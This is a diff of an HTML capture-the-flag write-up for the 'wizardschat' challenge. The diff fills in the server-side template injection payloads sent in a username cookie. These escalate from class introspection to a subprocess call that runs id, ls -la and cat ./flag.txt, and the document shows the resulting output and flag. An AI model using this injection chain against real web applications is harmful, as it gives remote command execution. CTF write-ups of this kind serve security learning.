@@ -100,7 +100,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
     <p><strong>Notes</strong>:</p>
     <ul>
       <li>The chat filters <strong>”&lt;”</strong> and <strong>”&gt;”</strong> to <strong>\&lt;</strong> and <strong>\&gt;</strong> respectively</li>
-      <li>The chat retains <em>__</em> but does not interpret them.</li>
+      <li>The chat retains <strong>{{ }}</strong> but does not interpret them.</li>
       <li>The chat seems to be a rabbit hole.
         <ul>
           <li>All messages sent by users are output through the chat.</li>
@@ -121,7 +121,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__ }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -151,7 +151,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__ }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -177,7 +177,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__[-1].__subclasses__() }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -198,7 +198,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__[-1].__subclasses__()[181] }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -219,7 +219,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__[-1].__subclasses__()[181]("id", shell=True, stdout=-1).communicate() }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -240,8 +240,8 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
 
 <h2 id="step-4--extract-the-flag">Step 4 : Extract the flag</h2>
 
-<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">payload</span><span class="o">=</span><span class="s2">""</span>
-curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&amp;/p'</span>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">payload</span><span class="o">=</span><span class="s2">"{&#123; self.__class__.__mro__[-1].__subclasses__()[181](</span><span class="se">\"</span><span class="s2">ls -la</span><span class="se">\"</span><span class="s2">, shell=True, stdout=-1).communicate() }}"</span>
+curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&/p'</span>
 
 <span class="c"># total 28</span>
 <span class="c"># drwxr-xr-x    1 root     root        4.0K Apr 18 16:48 .</span>
@@ -252,10 +252,10 @@ curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="n
 <span class="c"># -rwxr-xr-x    1 root     root          29 Apr 18 14:00 requirements.txt</span>
 <span class="c"># -rwxr-xr-x    1 root     root         827 Apr 16 07:09 upload.php</span>
 
-<span class="nv">payload</span><span class="o">=</span><span class="s2">""</span>
-curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&amp;/p'</span>
+<span class="nv">payload</span><span class="o">=</span><span class="s2">"{&#123; self.__class__.__mro__[-1].__subclasses__()[181](</span><span class="se">\"</span><span class="s2">cat ./flag.txt</span><span class="se">\"</span><span class="s2">, shell=True, stdout=-1).communicate() }}"</span>
+curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&/p'</span>
 
-<span class="c"># Username: (b&amp;#39;TG19{templates_make_a_better_chat}\n&amp;#39;, None)</span>
+<span class="c"># Username: (b&#39;TG19{templates_make_a_better_chat}\n&amp;#39;, None)</span>
 </code></pre></div></div>
 <hr />
 <h2 id="flag--tg19templates_make_a_better_chat">FLAG : <strong>TG19{templates_make_a_better_chat}</strong></h2>
